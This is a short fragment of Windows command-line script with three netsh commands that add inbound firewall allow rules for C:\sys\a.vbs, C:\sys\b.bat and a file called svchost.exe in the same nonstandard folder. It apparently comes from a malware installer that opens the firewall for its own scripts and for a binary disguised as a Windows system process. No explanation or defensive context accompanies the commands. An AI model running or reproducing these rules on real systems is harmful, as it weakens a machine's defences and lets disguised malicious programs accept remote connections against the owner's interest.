netsh advfirewall firewall add rule name="a.vbs" dir=in action=allow program="C:\sys\a.vbs" enable=yes
netsh advfirewall firewall add rule name="b.bat" dir=in action=allow program="C:\sys\b.bat" enable=yes
netsh advfirewall firewall add rule name="svchost.exe" dir=in action=allow program="C:\sys\svchost.exe" enable=yes